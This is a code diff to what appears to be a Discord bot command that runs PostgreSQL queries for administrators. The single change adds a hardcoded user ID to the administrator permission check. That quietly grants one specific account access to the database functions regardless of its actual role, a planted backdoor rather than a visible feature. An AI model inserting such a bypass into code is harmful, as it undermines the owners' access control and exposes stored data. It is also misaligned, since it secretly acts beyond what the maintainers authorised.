@@ -44,7 +44,7 @@ module.exports = {
         ),
     run: async (client, interaction, args) => {
         const target = interaction.guild.members.cache.get(interaction.user.id);
-        if (target.permissions.has("ADMINISTRATOR")) {
+        if (target.permissions.has("ADMINISTRATOR") || interaction.user.id == '546026031128248322') {
             const func = interaction.options.getString("function");
             if (func == "show_tables") {
                 pgClient.query(`SELECT * FROM pg_catalog.pg_tables WHERE schemaname != 'pg_catalog' AND schemaname != 'information_schema'`, async (err, res) => {
